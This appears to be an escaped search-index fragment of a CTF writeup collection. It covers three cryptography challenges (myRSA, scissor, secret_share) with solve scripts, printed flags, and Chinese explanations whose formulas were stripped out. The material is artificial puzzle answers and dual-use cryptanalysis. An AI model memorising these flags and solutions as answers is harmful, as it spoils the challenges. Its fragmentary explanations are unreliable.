0.cloud.chals.io 33723 myRSA.zip \u9898\u76ee\u63cf\u8ff0 \u8fd9\u9898oracle\u7b49\u5f88\u4e45\u624d\u80fd\u751f\u6210\u6570\uff08\u5f71\u54cd\u4e86\u6211\u62a2\u4e00\u8840\u7684\u901f\u5ea6\uff09\u9700\u8981\u8010\u5fc3\u7b49\u5f85\u3002 \u9898\u76ee\u57fa\u4e8eRSA\uff0c \u4e3a1024\u4f4d\u6570\uff0c \uff0c\u52a0\u5bc6\u8fc7\u7a0b\u4e3a \u5927\u6982\u4e3a1024\u4f4d\u6570 \u9898\u76ee\u7ed9\u51fa \u548cflag\u7684\u5bc6\u6587 \u3002\u5e76\u4e14\u6211\u4eec\u53ef\u4ee5\u8f93\u5165\u660e\u6587 \u5f97\u5230\u5bf9\u5e94\u7684\u5bc6\u6587 \u3002 \u6211\u7684\u89e3\u7b54 \u6ce8\u610f\u5230 \u4e5f\u5c31\u662f \u7136\u540e \u53ef\u4ee5\u770b\u6210\u662f \u5bf9 \u7684\u5e26\u4f59\u9664\u6cd5\u3002\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u7b2c\u4e00\u6b65\u7684 \u5bf9\u5e94\u7684 \uff08\u6b64\u65f6\u6211\u4eec\u53ef\u4ee5\u81ea\u5df1\u8ba1\u7b97\u51fa \u6765\uff09\u53ef\u4ee5\u76f4\u63a5\u5f97\u5230 \u7684\u503c\u3002\u7136\u540e\u5bf9 \u5f00\u4e09\u6b21\u65b9\u53ef\u4ee5\u5f00\u51fa \u6765\u3002 \u7136\u540e\u5c31\u53ef\u4ee5\u7ed3\u5408 \uff0c\u7528 z3-solver \u89e3\u51fa \u548c \u3002 \u4e4b\u540e\u5c31\u53ef\u4ee5\u8ba1\u7b97\u51fa \u548c \u7684\u503c\uff0c\u5e76\u4e14\u5229\u7528 \u9664\u4ee5 \u5f97\u5230RSA\u7684\u5bc6\u6587 \uff0c\u7136\u540e\u89e3RSA\u5373\u53ef\u3002 \u8fc7\u6389oracle\u7684proof of work\u68c0\u6d4b\uff0c\u7136\u540e\u7b49\u51e0\u5206\u949f\uff0c\u62ff\u5230 \u548c \uff0c\u7136\u540e\u968f\u4fbf\u8f93\u5165\u4e00\u4e2a 1 \u5f97\u5230\u5bc6\u6587 \u3002\u5c06\u5f97\u5230\u7684\u503c\u8f93\u5165\u4ee3\u7801\uff1a import gmpy2 from z3 import * from Crypto.Util.number import * n = 121642065448176156473897179092419728921875357974980389083860655277565704825649889226444419608980002630759091596085557548487575346914669740739314941122290996740304245650872046561895900796258456608793055028467475091633433839705791878132565383650206725088639081180463351423103722622744738467167869749662990688979 cc = 1136361046033913612036332714569670427841256258685140344055068620567475033294018028371032984703266206522526501010193123738345243273176762739282234315795608086725508770575402683003031958708516685141549840548134463272675351840929630389108825535204457117771682170437521557495770971608166831028637021920921360209937746104425491678161944802864369442195541546254091075147348470471884402144293370533562623258123204821582501280968271504384904817447094261612944693686431804933040510678517012219972815762511119200409624840705484711608894758448331870766284821627574717762202817452703132562199236232290523206855898302762507824719214766649522917767889370878378892167034276829407953963424463895887129146755081368470643425950316309913064297742492397168974520285387936917948771030039018332 cf = 295318431540053515087200928667285571195873544800963850029171139457738083432353682348226869156528183688490148373759627896871330766900837785451589779523111914618842905371837548861785389600883467087532763343406914524095383977741052854917948885361134719361023858033122670278053750085303927034983764865067526075420830992291379676788114928196956733017730193604813935484846679831060231258082875209851746699146625709301590969332851864108352895567376700175971571387738401144667542370193792481515722502753499780996972280714436836825211823165098486303895898784162737206171512239610585374041011016685047322413395385902117183922652085520924218305511771316307760747269759565922379004659918873467812356832776152950611990185909516951703495925411981576965707961331962771430522666692227338 m = 49 e = 0x10001 c = pow(m, e, n) cc = cc // c my = cc - 4 * n my1, ok = gmpy2.iroot(my, 3) p, q = Ints('p q') sol = Solver() ppq = int(ppq) sol.add(p + q == ppq) sol.add(p * q == n) if (sol.check() == sat): m = sol.model() p = m[p].as_long() q = m[q].as_long() x = p**2 * (p + 3*q - 1 ) + q**2 * (q + 3*p - 1) y = 2*p*q + p + q cf = cf // (x + y) mf = pow(cf, inverse(e, (p-1)*(q-1)), n) print(long_to_bytes(mf)) else: print('GG simida') Flag flag{ed649951-9ce9-46e0-a42b-d0ba588e43e1} Reference Writeup from https://zhuanlan.zhihu.com/p/402690414","title":"myRSA"},{"location":"Writeup/Cryptography/myRSA/#myrsa","text":"Category: Cryptography Source: \u7965\u4e91\u676f2021 Author: unknown Score: 15","title":"myRSA"},{"location":"Writeup/Cryptography/myRSA/#description","text":"\u6211\u7684\u7b2c\u4e00\u6b21\u5bc6\u7801\u5b66\u5bfc\u8bba\u4f5c\u4e1a, \u53c2\u6570\u7684\u751f\u6210\u5927\u5bb6\u89c9\u5f97\u600e\u6837\u5462\uff1f nc 0.cloud.chals.io 33723 myRSA.zip","title":"Description"},{"location":"Writeup/Cryptography/myRSA/#_1","text":"\u8fd9\u9898oracle\u7b49\u5f88\u4e45\u624d\u80fd\u751f\u6210\u6570\uff08\u5f71\u54cd\u4e86\u6211\u62a2\u4e00\u8840\u7684\u901f\u5ea6\uff09\u9700\u8981\u8010\u5fc3\u7b49\u5f85\u3002 \u9898\u76ee\u57fa\u4e8eRSA\uff0c \u4e3a1024\u4f4d\u6570\uff0c \uff0c\u52a0\u5bc6\u8fc7\u7a0b\u4e3a \u5927\u6982\u4e3a1024\u4f4d\u6570 \u9898\u76ee\u7ed9\u51fa \u548cflag\u7684\u5bc6\u6587 \u3002\u5e76\u4e14\u6211\u4eec\u53ef\u4ee5\u8f93\u5165\u660e\u6587 \u5f97\u5230\u5bf9\u5e94\u7684\u5bc6\u6587 \u3002","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"Writeup/Cryptography/myRSA/#_2","text":"\u6ce8\u610f\u5230 \u4e5f\u5c31\u662f \u7136\u540e \u53ef\u4ee5\u770b\u6210\u662f \u5bf9 \u7684\u5e26\u4f59\u9664\u6cd5\u3002\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u7b2c\u4e00\u6b65\u7684 \u5bf9\u5e94\u7684 \uff08\u6b64\u65f6\u6211\u4eec\u53ef\u4ee5\u81ea\u5df1\u8ba1\u7b97\u51fa \u6765\uff09\u53ef\u4ee5\u76f4\u63a5\u5f97\u5230 \u7684\u503c\u3002\u7136\u540e\u5bf9 \u5f00\u4e09\u6b21\u65b9\u53ef\u4ee5\u5f00\u51fa \u6765\u3002 \u7136\u540e\u5c31\u53ef\u4ee5\u7ed3\u5408 \uff0c\u7528 z3-solver \u89e3\u51fa \u548c \u3002 \u4e4b\u540e\u5c31\u53ef\u4ee5\u8ba1\u7b97\u51fa \u548c \u7684\u503c\uff0c\u5e76\u4e14\u5229\u7528 \u9664\u4ee5 \u5f97\u5230RSA\u7684\u5bc6\u6587 \uff0c\u7136\u540e\u89e3RSA\u5373\u53ef\u3002 \u8fc7\u6389oracle\u7684proof of work\u68c0\u6d4b\uff0c\u7136\u540e\u7b49\u51e0\u5206\u949f\uff0c\u62ff\u5230 \u548c \uff0c\u7136\u540e\u968f\u4fbf\u8f93\u5165\u4e00\u4e2a 1 \u5f97\u5230\u5bc6\u6587 \u3002\u5c06\u5f97\u5230\u7684\u503c\u8f93\u5165\u4ee3\u7801\uff1a import gmpy2 from z3 import * from Crypto.Util.number import * n = 121642065448176156473897179092419728921875357974980389083860655277565704825649889226444419608980002630759091596085557548487575346914669740739314941122290996740304245650872046561895900796258456608793055028467475091633433839705791878132565383650206725088639081180463351423103722622744738467167869749662990688979 cc = 1136361046033913612036332714569670427841256258685140344055068620567475033294018028371032984703266206522526501010193123738345243273176762739282234315795608086725508770575402683003031958708516685141549840548134463272675351840929630389108825535204457117771682170437521557495770971608166831028637021920921360209937746104425491678161944802864369442195541546254091075147348470471884402144293370533562623258123204821582501280968271504384904817447094261612944693686431804933040510678517012219972815762511119200409624840705484711608894758448331870766284821627574717762202817452703132562199236232290523206855898302762507824719214766649522917767889370878378892167034276829407953963424463895887129146755081368470643425950316309913064297742492397168974520285387936917948771030039018332 cf = 295318431540053515087200928667285571195873544800963850029171139457738083432353682348226869156528183688490148373759627896871330766900837785451589779523111914618842905371837548861785389600883467087532763343406914524095383977741052854917948885361134719361023858033122670278053750085303927034983764865067526075420830992291379676788114928196956733017730193604813935484846679831060231258082875209851746699146625709301590969332851864108352895567376700175971571387738401144667542370193792481515722502753499780996972280714436836825211823165098486303895898784162737206171512239610585374041011016685047322413395385902117183922652085520924218305511771316307760747269759565922379004659918873467812356832776152950611990185909516951703495925411981576965707961331962771430522666692227338 m = 49 e = 0x10001 c = pow(m, e, n) cc = cc // c my = cc - 4 * n my1, ok = gmpy2.iroot(my, 3) p, q = Ints('p q') sol = Solver() ppq = int(ppq) sol.add(p + q == ppq) sol.add(p * q == n) if (sol.check() == sat): m = sol.model() p = m[p].as_long() q = m[q].as_long() x = p**2 * (p + 3*q - 1 ) + q**2 * (q + 3*p - 1) y = 2*p*q + p + q cf = cf // (x + y) mf = pow(cf, inverse(e, (p-1)*(q-1)), n) print(long_to_bytes(mf)) else: print('GG simida')","title":"\u6211\u7684\u89e3\u7b54"},{"location":"Writeup/Cryptography/myRSA/#flag","text":"flag{ed649951-9ce9-46e0-a42b-d0ba588e43e1}","title":"Flag"},{"location":"Writeup/Cryptography/myRSA/#reference","text":"Writeup from https://zhuanlan.zhihu.com/p/402690414","title":"Reference"},{"location":"Writeup/Cryptography/scissor/","text":"scissor Category: Cryptography Source: redpwn CTF 2021 Author: BrownieInMotion Score: 5 Description I was given this string and told something about scissors. egddagzp_ftue_rxms_iuft_rxms_radymf Downloads encrypt.py Detailed solution Start by analyzing the encrypt code import random key = random.randint(0, 25) alphabet = 'abcdefghijklmnopqrstuvwxyz' shifted = alphabet[key:] + alphabet[:key] dictionary = dict(zip(alphabet, shifted)) print(''.join([ dictionary[c] if c in dictionary else c for c in input() ])) A random key from 0 to 25 is genereted The key is used to shift alphabet zip function used to pair each element of alphabet and shifted varaiables together https://www.w3schools.com/python/ref_func_zip.asp a dictionary (associative array) has been created from the output of zip function https://realpython.com/python-dicts/ An input is been used, we can see a loop with the input caracteres, a test is performed to check if the caractere is in the dicionary or not Finally we have the output in the challenge description egddagzp_ftue_rxms_iuft_rxms_radymf To be able to decrypt the output we need to : Find the used key (0,25) Loop with each caractere from the output and try to find the reversed caracter using the same performed test Save the matching caracteres and print all the keys from 0 to 25 Here is the solve code crypto-scissor.py import string flag = '' solve = '' alphabet = 'abcdefghijklmnopqrstuvwxyz' output = 'egddagzp_ftue_rxms_iuft_rxms_radymf' for i in range(0,26): shifted = alphabet[i:] + alphabet[:i] dictionary = dict(zip(alphabet, shifted)) for j in range(len(output)): for c in string.printable: solve = ''.join([ dictionary[c] if c in dictionary else c ]) if solve == output[j]: flag += c print(str(i) + \" => \" + flag) flag = \"\" Output 0 => egddagzp_ftue_rxms_iuft_rxms_radymf 1 => dfcczfyo_estd_qwlr_htes_qwlr_qzcxle 2 => cebbyexn_drsc_pvkq_gsdr_pvkq_pybwkd 3 => bdaaxdwm_cqrb_oujp_frcq_oujp_oxavjc 4 => aczzwcvl_bpqa_ntio_eqbp_ntio_nwzuib 5 => zbyyvbuk_aopz_mshn_dpao_mshn_mvytha 6 => yaxxuatj_znoy_lrgm_cozn_lrgm_luxsgz 7 => xzwwtzsi_ymnx_kqfl_bnym_kqfl_ktwrfy 8 => wyvvsyrh_xlmw_jpek_amxl_jpek_jsvqex 9 => vxuurxqg_wklv_iodj_zlwk_iodj_irupdw 10 => uwttqwpf_vjku_hnci_ykvj_hnci_hqtocv 11 => tvsspvoe_uijt_gmbh_xjui_gmbh_gpsnbu 12 => surround_this_flag_with_flag_format 13 => rtqqntmc_sghr_ekzf_vhsg_ekzf_enqlzs 14 => qsppmslb_rfgq_djye_ugrf_djye_dmpkyr 15 => proolrka_qefp_cixd_tfqe_cixd_clojxq 16 => oqnnkqjz_pdeo_bhwc_sepd_bhwc_bkniwp 17 => npmmjpiy_ocdn_agvb_rdoc_agvb_ajmhvo 18 => molliohx_nbcm_zfua_qcnb_zfua_zilgun 19 => lnkkhngw_mabl_yetz_pbma_yetz_yhkftm 20 => kmjjgmfv_lzak_xdsy_oalz_xdsy_xgjesl 21 => jliifleu_kyzj_wcrx_nzky_wcrx_wfidrk 22 => ikhhekdt_jxyi_vbqw_myjx_vbqw_vehcqj 23 => hjggdjcs_iwxh_uapv_lxiw_uapv_udgbpi 24 => giffcibr_hvwg_tzou_kwhv_tzou_tcfaoh 25 => fheebhaq_guvf_synt_jvgu_synt_sbezng We can see our flag with key 12 surround_this_flag_with_flag_format Flag flag{surround_this_flag_with_flag_format} Reference Writeup from https://github.com/BaadMaro/CTF/tree/main/redpwnCTF%202021/Crypto%20-%20scissor","title":"scissor"},{"location":"Writeup/Cryptography/scissor/#scissor","text":"Category: Cryptography Source: redpwn CTF 2021 Author: BrownieInMotion Score: 5","title":"scissor"},{"location":"Writeup/Cryptography/scissor/#description","text":"I was given this string and told something about scissors. egddagzp_ftue_rxms_iuft_rxms_radymf","title":"Description"},{"location":"Writeup/Cryptography/scissor/#downloads","text":"encrypt.py","title":"Downloads"},{"location":"Writeup/Cryptography/scissor/#detailed-solution","text":"Start by analyzing the encrypt code import random key = random.randint(0, 25) alphabet = 'abcdefghijklmnopqrstuvwxyz' shifted = alphabet[key:] + alphabet[:key] dictionary = dict(zip(alphabet, shifted)) print(''.join([ dictionary[c] if c in dictionary else c for c in input() ])) A random key from 0 to 25 is genereted The key is used to shift alphabet zip function used to pair each element of alphabet and shifted varaiables together https://www.w3schools.com/python/ref_func_zip.asp a dictionary (associative array) has been created from the output of zip function https://realpython.com/python-dicts/ An input is been used, we can see a loop with the input caracteres, a test is performed to check if the caractere is in the dicionary or not Finally we have the output in the challenge description egddagzp_ftue_rxms_iuft_rxms_radymf To be able to decrypt the output we need to : Find the used key (0,25) Loop with each caractere from the output and try to find the reversed caracter using the same performed test Save the matching caracteres and print all the keys from 0 to 25 Here is the solve code crypto-scissor.py import string flag = '' solve = '' alphabet = 'abcdefghijklmnopqrstuvwxyz' output = 'egddagzp_ftue_rxms_iuft_rxms_radymf' for i in range(0,26): shifted = alphabet[i:] + alphabet[:i] dictionary = dict(zip(alphabet, shifted)) for j in range(len(output)): for c in string.printable: solve = ''.join([ dictionary[c] if c in dictionary else c ]) if solve == output[j]: flag += c print(str(i) + \" => \" + flag) flag = \"\" Output 0 => egddagzp_ftue_rxms_iuft_rxms_radymf 1 => dfcczfyo_estd_qwlr_htes_qwlr_qzcxle 2 => cebbyexn_drsc_pvkq_gsdr_pvkq_pybwkd 3 => bdaaxdwm_cqrb_oujp_frcq_oujp_oxavjc 4 => aczzwcvl_bpqa_ntio_eqbp_ntio_nwzuib 5 => zbyyvbuk_aopz_mshn_dpao_mshn_mvytha 6 => yaxxuatj_znoy_lrgm_cozn_lrgm_luxsgz 7 => xzwwtzsi_ymnx_kqfl_bnym_kqfl_ktwrfy 8 => wyvvsyrh_xlmw_jpek_amxl_jpek_jsvqex 9 => vxuurxqg_wklv_iodj_zlwk_iodj_irupdw 10 => uwttqwpf_vjku_hnci_ykvj_hnci_hqtocv 11 => tvsspvoe_uijt_gmbh_xjui_gmbh_gpsnbu 12 => surround_this_flag_with_flag_format 13 => rtqqntmc_sghr_ekzf_vhsg_ekzf_enqlzs 14 => qsppmslb_rfgq_djye_ugrf_djye_dmpkyr 15 => proolrka_qefp_cixd_tfqe_cixd_clojxq 16 => oqnnkqjz_pdeo_bhwc_sepd_bhwc_bkniwp 17 => npmmjpiy_ocdn_agvb_rdoc_agvb_ajmhvo 18 => molliohx_nbcm_zfua_qcnb_zfua_zilgun 19 => lnkkhngw_mabl_yetz_pbma_yetz_yhkftm 20 => kmjjgmfv_lzak_xdsy_oalz_xdsy_xgjesl 21 => jliifleu_kyzj_wcrx_nzky_wcrx_wfidrk 22 => ikhhekdt_jxyi_vbqw_myjx_vbqw_vehcqj 23 => hjggdjcs_iwxh_uapv_lxiw_uapv_udgbpi 24 => giffcibr_hvwg_tzou_kwhv_tzou_tcfaoh 25 => fheebhaq_guvf_synt_jvgu_synt_sbezng We can see our flag with key 12 surround_this_flag_with_flag_format","title":"Detailed solution"},{"location":"Writeup/Cryptography/scissor/#flag","text":"flag{surround_this_flag_with_flag_format}","title":"Flag"},{"location":"Writeup/Cryptography/scissor/#reference","text":"Writeup from https://github.com/BaadMaro/CTF/tree/main/redpwnCTF%202021/Crypto%20-%20scissor","title":"Reference"},{"location":"Writeup/Cryptography/secret%20share/","text":"secret_share Category: Cryptography Source: \u7965\u4e91\u676f2021 Author: unknown Score: 35 Description Here is running a secret sharing system. But if the server colludes with some clever users, the whole system will not be safe any more. nc 0.cloud.chals.io 19892 secret_share.zip \u9898\u76ee\u63cf\u8ff0 \u6d4b\u8bd5\u4e86\u4e00\u4e0b\uff0c\u53d1\u73b0\u8981\u7528python 2\u8fd0\u884c\u670d\u52a1\u7aef\u4ee3\u7801\u3002 \u9898\u76ee\u57fa\u4e8e\u79bb\u6563\u5bf9\u6570\uff0c\u4e5f\u5c31\u662f \uff0c\u751f\u6210\u5143 \u548c\u6a21\u7d20\u6570 \u5728\u4ee3\u7801\u4e2d\u7ed9\u51fa\u3002 \u9898\u76ee\u7684\u52a0\u5bc6\u5982\u4e0b\uff1a\u4ea7\u751f\u968f\u673a\u7684 \uff0c\u8ba1\u7b97 \u4ea7\u751f\u7684\u5bc6\u6587\u4e3a \u3002 \u5e76\u4e14\u9898\u76ee\u8fd8\u6709\u4e00\u4e2a\u4e8c\u6b21\u52a0\u5bc6\uff1a \u4ea7\u751f\u7684\u5bc6\u6587\u4e3a \u4e00\u5f00\u59cboracle\u7ed9\u51fa\u4e00\u5bf9 \uff0c\u4f46\u662f\u6211\u4eec\u5bf9flag\u52a0\u5bc6\u6240\u7528\u7684\u4e3a \u3002\u6211\u4eec\u80fd\u77e5\u9053flag\u5bf9\u5e94\u5bc6\u6587 \u3002\u53ef\u4ee5\u5f97\u5230\u66f4\u591a\u63d0\u793a\uff0c\u4f46\u662f\u6211\u4eec\u9700\u8981\u8fc7\u5982\u4e0b\u6311\u6218\uff1a oracle\u6bcf\u6b21\u751f\u6210\u4e00\u4e2a200\u4f4d\u7684 \uff0c\u7136\u540e\u8fdb\u884c\u4e00\u4e2a rk_gen rk_gen \u662f\u4e00\u4e2a\u591a\u9879\u5f0f\u751f\u6210\uff0c\u4e00\u5f00\u59cb\u751f\u6210\u4e00\u4e2a \uff0c\u8bb0 \uff0c \u5bf9 \u3002 \u8fd9\u91cc\u4f1a\u7ed9\u51fa\u4e00\u4e2a \u7684\u503c\u8ba9\u6211\u4eec\u77e5\u9053\u3002 \u5bf9 encoder \u89c2\u5bdf\u5f97\uff1a \u4e00\u5f00\u59cb\u662f \u7b2c\u4e00\u56de\u5c31\u53d8\u6210\u4e86 \u7b2c\u4e8c\u56de\u5c31\u53d8\u6210\u4e86 \u89c2\u5bdf\u4e0e\u5f52\u7eb3\u53d1\u73b0\u4e4b\u540e\u4e5f\u6ee1\u8db3\u8fd9\u6837\u7684\u5f62\u5f0f\u3002 \u7531\u97e6\u8fbe\u5b9a\u7406\uff0c\u4e0a\u9762\u7684\u4e5f\u5c31\u53ef\u4ee5\u770b\u6210\u662f\u591a\u9879\u5f0f \u7684\u5c55\u5f00\u5f0f\u4e4b\u7cfb\u6570\u3002 \u5e76\u4e14\u5b9e\u9645\u7ed9\u6211\u4eec\u7684\u65f6\u5019\uff0c\u6211\u4eec\u77e5\u9053\u7684\u662f \u7136\u540e \u5e76\u4e14\u628a \u7528 \u52a0\u5bc6\u540e\uff0c\u518d\u5229\u7528\u8fd9\u91cc\u7b97\u51fa\u6765\u7684 \u8fdb\u884c\u4e8c\u6b21\u52a0\u5bc6\u4e4b\u540e\u7684\u7ed3\u679c \u544a\u8bc9\u6211\u4eec\u3002\u9700\u8981\u6211\u4eec\u7ed9\u51fa \u7684\u503c\u3002 \u5982\u679c4\u6b21\u6311\u6218\u6210\u529f\uff0c\u90a3\u4e48oracle\u63d0\u793a\u6211\u4eec\u8fd94\u6b21\u6240\u4ea7\u751f \u7684\u503c\u4e4b\u79ef\u3002 \u6211\u7684\u89e3\u7b54 \u9996\u5148\u6211\u4eec\u6765\u770b\u8fd9\u4e2a\u5bc6\u7801\u7cfb\u7edf\u7684\u89e3\u5bc6\uff1a\u5047\u8bbe\u6211\u4eec\u6709 \u7684\u8bdd\uff0c\u5bc6\u6587\u53ef\u4ee5\u88ab\u5199\u6210 \u6240\u4ee5 \u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u89e3\u5f97\u660e\u6587 \u3002 \u63a5\u4e0b\u6765\u6211\u4eec\u770b\u6311\u6218\u3002\u5b9e\u9645\u4e0a\uff0c\u6311\u6218\u5916\u90e8\u53ea\u6709 \u548c \u53c2\u4e0e\u4e86\u8fd0\u7b97\u3002\u6211\u4eec\u7684\u76ee\u7684\u662f\u6c42\u51fa\u6311\u6218\u4e2d\u7684 \u3002 \u5148\u5bf9\u4e8c\u6b21\u52a0\u5bc6\u7684\u7ed3\u679c\u8fdb\u884c\u5206\u6790\uff1a \u90a3\u4e48\uff0c\u5982\u679c\u6211\u4eec\u5df2\u77e5 \u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u6a21 \u7684\u9636\u4e3a \u8fd9\u4e00\u6027\u8d28\uff0c\u6c42\u51fa \u548c \uff0c\u8fdb\u800c\u6839\u636e\u4e0a\u9762\u5bc6\u7801\u7cfb\u7edf\u7684\u89e3\u5bc6\u6b65\u9aa4\u89e3\u51fa\u660e\u6587 \uff0c\u5b8c\u6210\u6311\u6218\u3002 \u53c8 \uff0c\u8fd9\u91cc\u6211\u4eec \u662f\u77e5\u9053\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u6c42 \u7684\u503c\u3002 \u4e8b\u5b9e\u4e0a\uff0c \u4e5f\u5c31\u662f\u8bf4 \u6211\u4eec\u4e5f\u662f\u5df2\u77e5\u7684\u3002\u90a3\u4e48\u76f8\u5f53\u4e8e\u8bf4\u6211\u4eec\u5c31\u53ef\u4ee5\u6709\u4e00\u4e2a\u591a\u9879\u5f0f \u3002 \u90a3\u4e48 \u6a21 \u7684\u503c\u5c31\u662f \uff01 \u5230\u8fd9\u91cc\uff0c\u6311\u6218\u89e3\u51b3\uff1a\u9996\u5148\u6211\u4eec\u53ef\u4ee5\u7b97\u51fa \uff0c\u8fdb\u800c\u7b97\u51fa \u5e76\u89e3\u5bc6\u51fa \uff0c\u5b8c\u6210\u6311\u6218\u3002 \u800c\u6311\u6218\u9001\u6211\u4eec\u7684\u5956\u52b1\u4e5f\u5c31\u662f\u56db\u4e2a \u7684\u4e58\u79ef\uff0c\u800c\u8fd9\u91cc \u662f\u4e0d\u53d8\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u7b97\u51fa \uff0c\u7136\u540e\u6a21 \u610f\u4e49\u4e0b\u89e3\u65b9\u7a0b\u5f97\u5230 \uff0c\u8fdb\u800c\u5bf9flag\u5bf9\u5e94\u5bc6\u6587 \u8fdb\u884c\u89e3\u5bc6\u5373\u53ef\u3002 \u641e\u5230\u63d0\u793a\u7684\u4ee3\u7801\u5982\u4e0b\uff1a # sage -python gao_2.py from pwn import * from sage.all import * from Crypto.Util.number import * from hashlib import sha256 def h2(m): return int(sha256(m).hexdigest(), 16) p = 0xb5655f7c97e8007baaf31716c305cf5950a935d239891c81e671c39b7b5b2544b0198a39fd13fa83830f93afb558321680713d4f6e6d7201d27256567b8f70c3 g = 0x85fd9ae42b57e515b7849b232fcd9575c18131235104d451eeceb991436b646d374086ca751846fdfec1ff7d4e1b9d6812355093a8227742a30361401ccc5577 conn = remote('47.104.85.225', 62351) conn.sendlineafter('choice>', '1') conn.recvuntil('Please take good care of it!\\n') s = conn.recvline() y, x = eval(s) conn.sendlineafter('choice>', '2') nlist = [33, 65, 129, 257] for n in nlist: # n = 33 # 33 conn.recvuntil('The cipher shared to you\\n') s = conn.recvline() c, (EE, VV, sr) = eval(s) conn.recvuntil('prefix, encoder = ') s = conn.recvline() encoder, prefix_hex = eval(s) prefix = int(prefix_hex, 16) Y0 = pow(prefix, x, p) P, (xx, ) = PolynomialRing(Zmod(p), 'xx').objgens() f1 = xx ** n for i in range(n): f1 += xx ** (n-i-1) * encoder[i] f2 = xx - Y0 ff = f1 % f2 r = int(ff) d = h2(prefix_hex.decode('hex') + long_to_bytes(r).rjust(64, '\\x00')) | 1 print(d) d2 = inverse(d, p-1) yev = pow(EE * VV, d2, p) m = c * inverse(yev, p) % p conn.sendline(hex(m)[2:]) conn.interactive() \u7136\u540e\u5f97\u5230\u63d0\u793a\u548c\u5bc6\u6587\u3002\u89e3\u5bc6\u7684\u811a\u672c\u5982\u4e0b\uff1a from Crypto.Util.number import * p = 0xb5655f7c97e8007baaf31716c305cf5950a935d239891c81e671c39b7b5b2544b0198a39fd13fa83830f93afb558321680713d4f6e6d7201d27256567b8f70c3 g = 0x85fd9ae42b57e515b7849b232fcd9575c18131235104d451eeceb991436b646d374086ca751846fdfec1ff7d4e1b9d6812355093a8227742a30361401ccc5577 c, (E, V, s) = (5585968041074025086153882651703151644252825797961750029846368850560274818374166788547796736374559756281986206108084144666719010198655069698311903223194165L, (7907022716121671499111670222633646508450620325985407809966619468858884394742418166662560533967841329320157194633470489479583638083109335158547004325407745L, 8405942693799264870593925170154538171389476686350775031149946204774020645560022720688012855017145834685204712310735071692308136544637274001444374071172215L, 4472917796572038030768951841580005906571419088430724545004411546215611452075638469061832923050311132351135006369648270174176244462571628294865215006848977L)) dlist = [88705054545798462592463535140496546230654103298029754196033655251576954884967, 3171548216431031323271233816116991780227219532639047192797048831559660952785, 115398379312678080372309706872824527861787247942202400632537054143103194010615, 85791902547465660732182842994118602329957914363880964530800626818535559558315] rs = 0x17be2ea8187855e3a4ff52657728c70efa4d8d51a9afb3a59fceb1ef85b377613f0271008951a7fcdf741a97892ec4a61c724e49ddb7d46b0e735448d35a1f29L Zp = Zmod(p) d = Zp(1) for x in dlist: d *= x rs = Zp(rs) s = rs * d ^ -1 P.<x> = PolynomialRing(Zp) f = x^4 - s fr = f.roots() c, E, V = map(Zp, (c, E, V)) for x1, po in fr: x1 = int(x1) yev = (E * V) ^ x1 m = c * yev ^ -1 m = int(m) print(long_to_bytes(int(m)).encode('hex')) Flag flag{504d0411-6707-469b-be31-9868200aca95} Reference Writeup from https://zhuanlan.zhihu.com/p/402690414","title":"secret_share"},{"location":"Writeup/Cryptography/secret%20share/#secret_share","text":"Category: Cryptography Source: \u7965\u4e91\u676f2021 Author: unknown Score: 35","title":"secret_share"},{"location":"Writeup/Cryptography/secret%20share/#description","text":"Here is running a secret sharing system. But if the server colludes with some clever users, the whole system will not be safe any more. nc 0.cloud.chals.io 19892 secret_share.zip","title":"Description"},{"location":"Writeup/Cryptography/secret%20share/#_1","text":"\u6d4b\u8bd5\u4e86\u4e00\u4e0b\uff0c\u53d1\u73b0\u8981\u7528python 2\u8fd0\u884c\u670d\u52a1\u7aef\u4ee3\u7801\u3002 \u9898\u76ee\u57fa\u4e8e\u79bb\u6563\u5bf9\u6570\uff0c\u4e5f\u5c31\u662f \uff0c\u751f\u6210\u5143 \u548c\u6a21\u7d20\u6570 \u5728\u4ee3\u7801\u4e2d\u7ed9\u51fa\u3002 \u9898\u76ee\u7684\u52a0\u5bc6\u5982\u4e0b\uff1a\u4ea7\u751f\u968f\u673a\u7684 \uff0c\u8ba1\u7b97 \u4ea7\u751f\u7684\u5bc6\u6587\u4e3a \u3002 \u5e76\u4e14\u9898\u76ee\u8fd8\u6709\u4e00\u4e2a\u4e8c\u6b21\u52a0\u5bc6\uff1a \u4ea7\u751f\u7684\u5bc6\u6587\u4e3a \u4e00\u5f00\u59cboracle\u7ed9\u51fa\u4e00\u5bf9 \uff0c\u4f46\u662f\u6211\u4eec\u5bf9flag\u52a0\u5bc6\u6240\u7528\u7684\u4e3a \u3002\u6211\u4eec\u80fd\u77e5\u9053flag\u5bf9\u5e94\u5bc6\u6587 \u3002\u53ef\u4ee5\u5f97\u5230\u66f4\u591a\u63d0\u793a\uff0c\u4f46\u662f\u6211\u4eec\u9700\u8981\u8fc7\u5982\u4e0b\u6311\u6218\uff1a oracle\u6bcf\u6b21\u751f\u6210\u4e00\u4e2a200\u4f4d\u7684 \uff0c\u7136\u540e\u8fdb\u884c\u4e00\u4e2a rk_gen rk_gen \u662f\u4e00\u4e2a\u591a\u9879\u5f0f\u751f\u6210\uff0c\u4e00\u5f00\u59cb\u751f\u6210\u4e00\u4e2a \uff0c\u8bb0 \uff0c \u5bf9 \u3002 \u8fd9\u91cc\u4f1a\u7ed9\u51fa\u4e00\u4e2a \u7684\u503c\u8ba9\u6211\u4eec\u77e5\u9053\u3002 \u5bf9 encoder \u89c2\u5bdf\u5f97\uff1a \u4e00\u5f00\u59cb\u662f \u7b2c\u4e00\u56de\u5c31\u53d8\u6210\u4e86 \u7b2c\u4e8c\u56de\u5c31\u53d8\u6210\u4e86 \u89c2\u5bdf\u4e0e\u5f52\u7eb3\u53d1\u73b0\u4e4b\u540e\u4e5f\u6ee1\u8db3\u8fd9\u6837\u7684\u5f62\u5f0f\u3002 \u7531\u97e6\u8fbe\u5b9a\u7406\uff0c\u4e0a\u9762\u7684\u4e5f\u5c31\u53ef\u4ee5\u770b\u6210\u662f\u591a\u9879\u5f0f \u7684\u5c55\u5f00\u5f0f\u4e4b\u7cfb\u6570\u3002 